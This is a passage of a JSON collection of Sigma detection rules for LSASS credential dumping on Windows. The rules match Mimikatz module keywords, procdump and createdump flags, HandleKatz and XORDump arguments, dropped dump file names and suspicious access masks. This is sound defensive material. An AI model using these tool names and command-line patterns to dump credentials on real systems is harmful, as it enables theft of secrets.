                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2018/09/09\ndescription: Detects a highly relevant Antivirus alert that reports a password dumper\ndetection:\n  condition: selection\n  selection:\n  - Signature|startswith: PWS\n  - Signature|contains:\n    - DumpCreds\n    - Mimikatz\n    - PWCrack\n    - HTool/WCE\n    - PSWTool\n    - PWDump\n    - SecurityTool\n    - PShlSpy\n    - Rubeus\n    - Kekeo\n    - LsassDump\n    - Outflank\n    - DumpLsass\n    - SharpDump\n    - PWSX\n    - PWS.\nfalsepositives:\n- Unlikely\nfields:\n- FileName\n- User\nid: 78cc2dd2-7d20-4d32-93ff-057084c38b93\nlevel: critical\nlogsource:\n  category: antivirus\nmodified: 2023/01/18\nreferences:\n- https://www.nextron-systems.com/?s=antivirus\n- https://www.virustotal.com/gui/file/5fcda49ee7f202559a6cbbb34edb65c33c9a1e0bde9fa2af06a6f11b55ded619\n- https://www.virustotal.com/gui/file/a4edfbd42595d5bddb442c82a02cf0aaa10893c1bf79ea08b9ce576f82749448\nstatus: stable\ntags:\n- attack.credential_access\n- attack.t1003\n- attack.t1558\n- attack.t1003.001\n- attack.t1003.002\ntitle: Antivirus Password Dumper Detection\n",
                            "sigma:id": "78cc2dd2-7d20-4d32-93ff-057084c38b93",
                            "title": "Antivirus Password Dumper Detection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ffa6861c-4461-4f59-8a41-578c39f3f23e",
                        "lookup_data": {
                            "description": "Detect creation of dump files containing the memory space of lsass.exe, which contains sensitive credentials.\nIdentifies usage of Sysinternals procdump.exe to export the memory space of lsass.exe which contains sensitive credentials.\n",
                            "raw": "author: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community\ndate: 2019/10/24\ndescription: 'Detect creation of dump files containing the memory space of lsass.exe,\n  which contains sensitive credentials.\n\n  Identifies usage of Sysinternals procdump.exe to export the memory space of lsass.exe\n  which contains sensitive credentials.\n\n  '\ndetection:\n  condition: (selection1 and not filter) or selection2\n  filter:\n    Image|endswith: \\werfault.exe\n  selection1:\n    CommandLine|contains|all:\n    - lsass\n    - .dmp\n  selection2:\n    CommandLine|contains: lsass\n    Image|contains: \\procdump\n    Image|endswith: .exe\nfalsepositives:\n- Unlikely\nfields:\n- ComputerName\n- User\n- CommandLine\nid: ffa6861c-4461-4f59-8a41-578c39f3f23e\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/11\nreferences:\n- https://eqllib.readthedocs.io/en/latest/analytics/1e1ef6be-12fc-11e9-8d76-4d6bb837cda4.html\n- https://eqllib.readthedocs.io/en/latest/analytics/210b4ea4-12fc-11e9-8d76-4d6bb837cda4.html\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003/T1003.md\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: LSASS Memory Dumping\n",
                            "sigma:id": "ffa6861c-4461-4f59-8a41-578c39f3f23e",
                            "title": "LSASS Memory Dumping",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ca621ba5-54ab-4035-9942-d378e6fcde3c",
                        "lookup_data": {
                            "description": "Detects the use of HandleKatz, a tool that demonstrates the usage of cloned handles to Lsass in order to create an obfuscated memory dump of the same",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/08/18\ndescription: Detects the use of HandleKatz, a tool that demonstrates the usage of\n  cloned handles to Lsass in order to create an obfuscated memory dump of the same\ndetection:\n  condition: 1 of selection_*\n  selection_flags:\n    CommandLine|contains:\n    - .dmp\n    - lsass\n    - .obf\n    - dump\n    CommandLine|contains|all:\n    - '--pid:'\n    - '--outfile:'\n  selection_loader_img:\n    CommandLine|contains: '--pid:'\n    Image|endswith: \\loader.exe\n  selection_loader_imphash:\n  - Imphash:\n    - 38d9e015591bbfd4929e0d0f47fa0055\n    - 0e2216679ca6e1094d63322e3412d650\n  - Hashes:\n    - IMPHASH=38D9E015591BBFD4929E0D0F47FA0055\n    - IMPHASH=0E2216679CA6E1094D63322E3412D650\nfalsepositives:\n- Unknown\nid: ca621ba5-54ab-4035-9942-d378e6fcde3c\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/05\nreferences:\n- https://github.com/codewhitesec/HandleKatz\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: HandleKatz LSASS Dumper Usage\n",
                            "sigma:id": "ca621ba5-54ab-4035-9942-d378e6fcde3c",
                            "title": "HandleKatz LSASS Dumper Usage",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4a1b6da0-d94f-4fc3-98fc-2d9cb9e5ee76",
                        "lookup_data": {
                            "description": "Detects process handle on LSASS process with certain access mask",
                            "raw": "author: Roberto Rodriguez, Teymur Kheirkhabarov, Dimitrios Slamaris, Mark Russinovich,\n  Aleksey Potapov, oscd.community (update)\ndate: 2019/11/01\ndescription: Detects process handle on LSASS process with certain access mask\ndetection:\n  condition: 1 of selection_* and not 1 of filter*\n  filter1:\n    ProcessName|endswith:\n    - \\wmiprvse.exe\n    - \\taskmgr.exe\n    - \\procexp64.exe\n    - \\procexp.exe\n    - \\lsm.exe\n    - \\csrss.exe\n    - \\wininit.exe\n    - \\vmtoolsd.exe\n    - \\minionhost.exe\n    - \\VsTskMgr.exe\n    - \\thor.exe\n    - \\thor64.exe\n    - \\MicrosoftEdgeUpdate.exe\n    - \\GamingServices.exe\n    - \\svchost.exe\n    - \\MsMpEng.exe\n    - \\MRT.exe\n    - RtkAudUService64\n    ProcessName|startswith:\n    - C:\\Windows\\System32\\\n    - C:\\Windows\\SysWow64\\\n    - C:\\Windows\\SysNative\\\n    - C:\\Program Files\\\n    - C:\\Program Files (x86)\\\n    - C:\\Windows\\Temp\\asgard2-agent\\\n    - C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\\n  filter2:\n    ProcessName|startswith: C:\\Program Files\n  filter3:\n    ProcessName: C:\\Windows\\CCM\\CcmExec.exe\n  filter4:\n    ProcessName:\n    - C:\\Windows\\System32\\taskhostw.exe\n    - C:\\Windows\\System32\\msiexec.exe\n  filter_games:\n    ProcessName|contains: \\SteamLibrary\\steamapps\\\n  selection_1:\n    AccessMask|contains:\n    - '0x40'\n    - '0x1400'\n    - '0x100000'\n    - '0x1410'\n    - '0x1010'\n    - '0x1438'\n    - '0x143a'\n    - '0x1418'\n    - '0x1f0fff'\n    - '0x1f1fff'\n    - '0x1f2fff'\n    - '0x1f3fff'\n    EventID: 4656\n    ObjectName|endswith: \\lsass.exe\n  selection_2:\n    AccessList|contains:\n    - '4484'\n    - '4416'\n    EventID: 4663\n    ObjectName|endswith: \\lsass.exe\nfalsepositives:\n- Legitimate software accessing LSASS process for legitimate reason; update the whitelist\n  with it\nfields:\n- ComputerName\n- SubjectDomainName\n- SubjectUserName\n- ProcessName\n- ProcessID\nid: 4a1b6da0-d94f-4fc3-98fc-2d9cb9e5ee76\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/11/13\nreferences:\n- https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nstatus: experimental\ntags:\n- attack.credential_access\n- car.2019-04-004\n- attack.t1003.001\ntitle: Generic Password Dumper Activity on LSASS\n",
                            "sigma:id": "4a1b6da0-d94f-4fc3-98fc-2d9cb9e5ee76",
                            "title": "Generic Password Dumper Activity on LSASS",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a642964e-bead-4bed-8910-1bb4d63e3b4d",
                        "lookup_data": {
                            "description": "Detection well-known mimikatz command line arguments",
                            "raw": "author: Teymur Kheirkhabarov, oscd.community, David ANDRE (additional keywords), Tim\n  Shelton\ndate: 2019/10/22\ndescription: Detection well-known mimikatz command line arguments\ndetection:\n  condition: ( selection_1 or (module_names and mimikatz_separator) or (function_names\n    and mimikatz_separator) ) and not 1 of filter*\n  filter_1:\n    CommandLine|contains: function Convert-GuidToCompressedGuid\n  filter_vscode:\n    CommandLine|contains|all:\n    - '/d /s /c '\n    - 'checkfilenameiocs --ioc-path '\n    ParentImage|endswith: \\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\n  function_names:\n    CommandLine|contains:\n    - aadcookie\n    - detours\n    - memssp\n    - mflt\n    - ncroutemon\n    - ngcsign\n    - printnightmare\n    - skeleton\n    - preshutdown\n    - mstsc\n    - multirdp\n  mimikatz_separator:\n    CommandLine|contains: '::'\n  module_names:\n    CommandLine|contains:\n    - rpc\n    - token\n    - crypto\n    - dpapi\n    - sekurlsa\n    - kerberos\n    - lsadump\n    - privilege\n    - process\n    - vault\n  selection_1:\n    CommandLine|contains:\n    - DumpCreds\n    - invoke-mimikatz\nfalsepositives:\n- Legitimate Administrator using tool for password recovery\nid: a642964e-bead-4bed-8910-1bb4d63e3b4d\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/07\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n- https://tools.thehacker.recipes/mimikatz/modules\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\n- attack.t1003.006\ntitle: Mimikatz Command Line\n",
                            "sigma:id": "a642964e-bead-4bed-8910-1bb4d63e3b4d",
                            "title": "Mimikatz Command Line",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b99a1518-1ad5-4f65-bc95-1ffff97a8fd0",
                        "lookup_data": {
                            "description": "Detects the use of Inveigh a cross-platform .NET IPv4/IPv6 machine-in-the-middle tool",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/10/24\ndescription: Detects the use of Inveigh a cross-platform .NET IPv4/IPv6 machine-in-the-middle\n  tool\ndetection:\n  condition: selection\n  selection:\n  - Image|endswith: \\Inveigh.exe\n  - OriginalFileName:\n    - \\Inveigh.exe\n    - \\Inveigh.dll\n  - Description: Inveigh\n  - CommandLine|contains:\n    - ' -SpooferIP'\n    - ' -ReplyToIPs '\n    - ' -ReplyToDomains '\n    - ' -ReplyToMACs '\n    - ' -SnifferIP'\nfalsepositives:\n- Very unlikely\nid: b99a1518-1ad5-4f65-bc95-1ffff97a8fd0\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/Kevin-Robertson/Inveigh\n- https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Inveigh Hack Tool\n",
                            "sigma:id": "b99a1518-1ad5-4f65-bc95-1ffff97a8fd0",
                            "title": "Inveigh Hack Tool",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a6b33c02-8305-488f-8585-03cb2a7763f2",
                        "lookup_data": {
                            "description": "Detects the use of Windows Credential Editor (WCE)",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/12/31\ndescription: Detects the use of Windows Credential Editor (WCE)\ndetection:\n  condition: selection\n  selection:\n    TargetObject|contains: Services\\WCESERVICE\\Start\nfalsepositives:\n- Unknown\nid: a6b33c02-8305-488f-8585-03cb2a7763f2\nlevel: critical\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.ampliasecurity.com/research/windows-credentials-editor/\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.s0005\ntitle: Windows Credential Editor Registry\n",
                            "sigma:id": "a6b33c02-8305-488f-8585-03cb2a7763f2",
                            "title": "Windows Credential Editor Registry",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "515c8be5-e5df-4c5e-8f6d-a4a2f05e4b48",
                        "lookup_data": {
                            "description": "Detects uses of the createdump.exe LOLOBIN utility to dump process memory",
                            "raw": "author: Florian Roth (Nextron Systems), Nasreddine Bencherchali\ndate: 2022/01/04\ndescription: Detects uses of the createdump.exe LOLOBIN utility to dump process memory\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains:\n    - ' -u '\n    - ' --full '\n    - ' -f '\n    - ' --name '\n    - '.dmp '\n  selection_img:\n  - Image|endswith: \\createdump.exe\n  - OriginalFileName: FX_VER_INTERNALNAME_STR\nfalsepositives:\n- Command lines that use the same flags\nid: 515c8be5-e5df-4c5e-8f6d-a4a2f05e4b48\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/19\nreferences:\n- https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/\n- https://twitter.com/bopin2020/status/1366400799199272960\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1036\n- attack.t1003.001\ntitle: CreateDump Process Dump\n",
                            "sigma:id": "515c8be5-e5df-4c5e-8f6d-a4a2f05e4b48",
                            "title": "CreateDump Process Dump",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "aa35a627-33fb-4d04-a165-d33b4afca3e8",
                        "lookup_data": {
                            "description": "Detects usage of mimikatz through WinRM protocol by monitoring access to lsass process by wsmprovhost.exe.",
                            "raw": "author: Patryk Prauze - ING Tech\ndate: 2019/05/20\ndescription: Detects usage of mimikatz through WinRM protocol by monitoring access\n  to lsass process by wsmprovhost.exe.\ndetection:\n  condition: selection and not filter\n  filter:\n    GrantedAccess: '0x80000000'\n  selection:\n    SourceImage: C:\\Windows\\system32\\wsmprovhost.exe\n    TargetImage|endswith: \\lsass.exe\nfalsepositives:\n- Unlikely\nid: aa35a627-33fb-4d04-a165-d33b4afca3e8\nlevel: high\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2021/06/21\nreferences:\n- https://pentestlab.blog/2018/05/15/lateral-movement-winrm/\nstatus: stable\ntags:\n- attack.credential_access\n- attack.execution\n- attack.t1003.001\n- attack.t1059.001\n- attack.lateral_movement\n- attack.t1021.006\n- attack.s0002\ntitle: Mimikatz through Windows Remote Management\n",
                            "sigma:id": "aa35a627-33fb-4d04-a165-d33b4afca3e8",
                            "title": "Mimikatz through Windows Remote Management",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "66e563f9-1cbd-4a22-a957-d8b7c0f44372",
                        "lookup_data": {
                            "description": "Detects suspicious use of XORDump process memory dumping utility",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/01/28\ndescription: Detects suspicious use of XORDump process memory dumping utility\ndetection:\n  condition: selection\n  selection:\n  - Image|endswith: \\xordump.exe\n  - CommandLine|contains:\n    - ' -process lsass.exe '\n    - ' -m comsvcs '\n    - ' -m dbghelp '\n    - ' -m dbgcore '\nfalsepositives:\n- Another tool that uses the command line switches of XORdump\nid: 66e563f9-1cbd-4a22-a957-d8b7c0f44372\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/audibleblink/xordump\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1036\n- attack.t1003.001\ntitle: XORDump Use\n",
                            "sigma:id": "66e563f9-1cbd-4a22-a957-d8b7c0f44372",
                            "title": "XORDump Use",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4c0aaedc-154c-4427-ada0-d80ef9c9deb6",
                        "lookup_data": {
                            "description": "Detects a possible process memory dump that uses the white-listed Citrix TrolleyExpress.exe filename as a way to dump the lsass process memory",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/02/10\ndescription: Detects a possible process memory dump that uses the white-listed Citrix\n  TrolleyExpress.exe filename as a way to dump the lsass process memory\ndetection:\n  condition: selection or ( renamed and not 1 of filter* )\n  filter_empty:\n    OriginalFileName: null\n  filter_renamed:\n    OriginalFileName|contains: CtxInstall\n  renamed:\n    Image|endswith: \\TrolleyExpress.exe\n  selection:\n    CommandLine|contains:\n    - \\TrolleyExpress 7\n    - \\TrolleyExpress 8\n    - \\TrolleyExpress 9\n    - \\TrolleyExpress.exe 7\n    - \\TrolleyExpress.exe 8\n    - \\TrolleyExpress.exe 9\n    - '\\TrolleyExpress.exe -ma '\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 4c0aaedc-154c-4427-ada0-d80ef9c9deb6\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/05/13\nreferences:\n- https://twitter.com/_xpn_/status/1491557187168178176\n- https://www.youtube.com/watch?v=Ie831jF0bb0\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218.011\n- attack.credential_access\n- attack.t1003.001\ntitle: Process Access via TrolleyExpress Exclusion\n",
                            "sigma:id": "4c0aaedc-154c-4427-ada0-d80ef9c9deb6",
                            "title": "Process Access via TrolleyExpress Exclusion",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "edadb1e5-5919-4e4c-8462-a9e643b02c4b",
                        "lookup_data": {
                            "description": "Detects a process memory dump performed by RdrLeakDiag.exe",
                            "raw": "author: Cedric MAURUGEON\ndate: 2021/09/24\ndescription: Detects a process memory dump performed by RdrLeakDiag.exe\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: fullmemdmp\n    OriginalFileName: RdrLeakDiag.exe\nfalsepositives:\n- Unknown\nid: edadb1e5-5919-4e4c-8462-a9e643b02c4b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://www.pureid.io/dumping-abusing-windows-credentials-part-1/\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Process Dump via RdrLeakDiag.exe\n",
                            "sigma:id": "edadb1e5-5919-4e4c-8462-a9e643b02c4b",
                            "title": "Process Dump via RdrLeakDiag.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "8fbf3271-1ef6-4e94-8210-03c2317947f6",
                        "lookup_data": {
                            "description": "Files with well-known filenames (parts of credential dump software or files produced by them) creation",
                            "raw": "author: Teymur Kheirkhabarov, oscd.community\ndate: 2019/11/01\ndescription: Files with well-known filenames (parts of credential dump software or\n  files produced by them) creation\ndetection:\n  condition: selection\n  selection:\n  - TargetFilename|contains:\n    - \\pwdump\n    - \\kirbi\n    - \\pwhashes\n    - \\wce_ccache\n    - \\wce_krbtkts\n    - \\fgdump-log\n  - TargetFilename|endswith:\n    - \\test.pwd\n    - \\lsremora64.dll\n    - \\lsremora.dll\n    - \\fgexec.exe\n    - \\wceaux.dll\n    - \\SAM.out\n    - \\SECURITY.out\n    - \\SYSTEM.out\n    - \\NTDS.out\n    - \\DumpExt.dll\n    - \\DumpSvc.exe\n    - \\cachedump64.exe\n    - \\cachedump.exe\n    - \\pstgdump.exe\n    - \\servpw.exe\n    - \\servpw64.exe\n    - \\pwdump.exe\n    - \\procdump64.exe\n    - \\Dumpy.exe\nfalsepositives:\n- Legitimate Administrator using tool for password recovery\nid: 8fbf3271-1ef6-4e94-8210-03c2317947f6\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/09/21\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.003\n- attack.t1003.004\n- attack.t1003.005\ntitle: Cred Dump Tools Dropped Files\n",
                            "sigma:id": "8fbf3271-1ef6-4e94-8210-03c2317947f6",
                            "title": "Cred Dump Tools Dropped Files",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "df5ff0a5-f83f-4a5b-bba1-3e6a3f6f6ea2",
                        "lookup_data": {
                            "description": "Detects well-known credential dumping tools execution via service execution events",
                            "raw": "author: Florian Roth (Nextron Systems), Teymur Kheirkhabarov, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2017/03/05\ndescription: Detects well-known credential dumping tools execution via service execution\n  events\ndetection:\n  condition: selection\n  selection:\n    ImageLoaded|contains:\n    - fgexec\n    - dumpsvc\n    - cachedump\n    - mimidrv\n    - gsecdump\n    - servpw\n    - pwdump\nfalsepositives:\n- Legitimate Administrator using credential dumping tool for password recovery\nid: df5ff0a5-f83f-4a5b-bba1-3e6a3f6f6ea2\nlevel: critical\nlogsource:\n  category: driver_load\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nrelated:\n- id: 4976aa50-8f41-45c6-8b15-ab3fc10e79ed\n  type: derived\nstatus: test\ntags:\n- attack.credential_access\n- attack.execution\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\n- attack.t1003.006\n- attack.t1569.002\n- attack.s0005\ntitle: Credential Dumping Tools Service Execution\n",
                            "sigma:id": "df5ff0a5-f83f-4a5b-bba1-3e6a3f6f6ea2",
                            "title": "Credential Dumping Tools Service Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "910ab938-668b-401b-b08c-b596e80fdca5",
                        "lookup_data": {
                            "description": "Transferring files with well-known filenames (sensitive files with credential data) using network shares",
                            "raw": "author: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\ndescription: Transferring files with well-known filenames (sensitive files with credential\n  data) using network shares\ndetection:\n  condition: selection\n  selection:\n    EventID: 5145\n    Provider_Name: Microsoft-Windows-Security-Auditing\n    RelativeTargetName|contains:\n    - \\mimidrv\n    - \\lsass\n    - \\windows\\minidump\\\n    - \\hiberfil\n    - \\sqldmpr\n    - \\sam\n    - \\ntds.dit\n    - \\security\nfalsepositives:\n- Transferring sensitive files for legitimate administration work by legitimate administrator\nid: 910ab938-668b-401b-b08c-b596e80fdca5\nlevel: medium\nlogsource:\n  product: windows\n  service: security\nmodified: 2021/11/30\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nrelated:\n- id: 2e69f167-47b5-4ae7-a390-47764529eff5\n  type: similar\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.001\n- attack.t1003.003\ntitle: Transferring Files with Credential Data via Network Shares\n",
                            "sigma:id": "910ab938-668b-401b-b08c-b596e80fdca5",
                            "title": "Transferring Files with Credential Data via Network Shares",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "eb1c4225-1c23-4241-8dd4-051389fde4ce",
                        "lookup_data": {
                            "description": "Detects suspicious ways to use of a Visual Studio bundled tool named DumpMinitool.exe",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/04/06\ndescription: Detects suspicious ways to use of a Visual Studio bundled tool named\n  DumpMinitool.exe\ndetection:\n  cmd_has_flags:\n    CommandLine|contains: ' Full'\n  condition: selection and ( ( not filter_folder ) or susp_flags or ( cmd_has_flags\n    and not filter_cmd_misses_flags ) )\n  filter_cmd_misses_flags:\n    CommandLine|contains: --dumpType\n  filter_folder:\n    Image|contains:\n    - \\Microsoft Visual Studio\\\n    - \\Extensions\\\n  selection:\n  - Image|endswith: \\DumpMinitool.exe\n  - OriginalFileName: DumpMinitool.exe\n  susp_flags:\n    CommandLine|contains: .txt\nfalsepositives:\n- Unknown\nid: eb1c4225-1c23-4241-8dd4-051389fde4ce\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/30\nreferences:\n- https://twitter.com/mrd0x/status/1511415432888131586\n- https://twitter.com/mrd0x/status/1511489821247684615\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1036\n- attack.t1003.001\ntitle: Suspicious DumpMinitool Usage\n",
                            "sigma:id": "eb1c4225-1c23-4241-8dd4-051389fde4ce",
                            "title": "Suspicious DumpMinitool Usage",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "761270e6-3a97-4c18-9a44-a844cb5b562b",
                        "lookup_data": {
                            "description": "Chiseling In: Lorenz Ransomware Group Cracks MiVoice And Calls Back For Free",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/761270e6-3a97-4c18-9a44-a844cb5b562b.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1666603345",
                            "uuid": "761270e6-3a97-4c18-9a44-a844cb5b562b",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a18dd26b-6450-46de-8c91-9659150cf088",
                        "lookup_data": {
                            "description": "Detects process access to LSASS memory with suspicious access flags",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/11/22\ndescription: Detects process access to LSASS memory with suspicious access flags\ndetection:\n  condition: selection and not 1 of filter*\n  filter1:\n    SourceImage|endswith: \\MsMpEng.exe\n    SourceImage|startswith: C:\\ProgramData\\Microsoft\\Windows Defender\\\n  filter2:\n    SourceImage|endswith: \\vmtoolsd.exe\n    SourceImage|startswith: C:\\ProgramData\\VMware\\VMware Tools\\\n  filter3:\n    SourceImage|contains: Antivirus\n    SourceImage|startswith:\n    - C:\\Program Files\\\n    - C:\\Program Files (x86)\\\n  filter_absolute:\n    SourceImage:\n    - C:\\WINDOWS\\system32\\taskmgr.exe\n    - C:\\Program Files\\Malwarebytes\\Anti-Malware\\MBAMService.exe\n    - C:\\PROGRAMDATA\\MALWAREBYTES\\MBAMSERVICE\\ctlrupdate\\mbupdatr.exe\n    - C:\\WINDOWS\\system32\\taskhostw.exe\n    - C:\\Users\\\\*\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\n    - C:\\Program Files\\Windows Defender\\MsMpEng.exe\n    - C:\\Windows\\SysWOW64\\msiexec.exe\n    - C:\\Windows\\System32\\msiexec.exe\n    - C:\\Windows\\System32\\lsass.exe\n    - C:\\WINDOWS\\System32\\perfmon.exe\n    - C:\\Windows\\System32\\MRT.exe\n    - C:\\Program Files\\Cisco\\Cisco AnyConnect Secure Mobility Client\\vpnagent.exe\n    - C:\\Program Files (x86)\\Cisco\\Cisco AnyConnect Secure Mobility Client\\vpnagent.exe\n  filter_mcafee:\n    SourceImage: C:\\Program Files\\Common Files\\McAfee\\MMSSHost\\MMSSHOST.exe\n  filter_mrt:\n    GrantedAccess: '0x1418'\n    SourceImage: C:\\WINDOWS\\system32\\MRT.exe\n  filter_nextron:\n    GrantedAccess: '0x1fffff'\n    SourceImage|endswith:\n    - \\thor64.exe\n    - \\thor.exe\n    SourceImage|startswith: C:\\Windows\\Temp\\asgard2-agent\\\n  filter_windefend2:\n    CallTrace|contains|all:\n    - '|C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{'\n    - '}\\mpengine.dll+'\n    GrantedAccess: '0x1418'\n  selection:\n    GrantedAccess|endswith:\n    - '30'\n    - '50'\n    - '70'\n    - '90'\n    - B0\n    - D0\n    - F0\n    - '18'\n    - '38'\n    - '58'\n    - '78'\n    - '98'\n    - B8\n    - D8\n    - F8\n    - 1A\n    - 3A\n    - 5A\n    - 7A\n    - 9A\n    - BA\n    - DA\n    - FA\n    - '0x14C2'\n    TargetImage|endswith: \\lsass.exe\nfalsepositives:\n- Legitimate software accessing LSASS process for legitimate reason\nfields:\n- User\n- SourceImage\n- GrantedAccess\nid: a18dd26b-6450-46de-8c91-9659150cf088\nlevel: high\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2022/06/20\nreferences:\n- https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights\n- https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&ithint=file%2cpptx&app=PowerPoint&authkey=!AMvCRTKB_V1J5ow\n- https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n- http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL_notes.pdf\nrelated:\n- id: 32d0d3e2-e58d-4d41-926b-18b520b2b32d\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.s0002\ntitle: Suspicious GrantedAccess Flags on LSASS Access\n",
                            "sigma:id": "a18dd26b-6450-46de-8c91-9659150cf088",
                            "title": "Suspicious GrantedAccess Flags on LSASS Access",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "857c8db3-c89b-42fb-882b-f681c7cf4da2",
                        "lookup_data": {
                            "description": "Loading unsigned image (DLL, EXE) into LSASS process",
                            "raw": "author: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\ndescription: Loading unsigned image (DLL, EXE) into LSASS process\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\lsass.exe\n    Signed: 'false'\nfalsepositives:\n- Valid user connecting using RDP\nid: 857c8db3-c89b-42fb-882b-f681c7cf4da2\nlevel: medium\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Unsigned Image Loaded Into LSASS Process\n",
                            "sigma:id": "857c8db3-c89b-42fb-882b-f681c7cf4da2",
                            "title": "Unsigned Image Loaded Into LSASS Process",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e76c8240-d68f-4773-8880-5c6f63595aaf",
                        "lookup_data": {
                            "description": "Detects usage of Time Travel Debugging Utility. Adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe.",
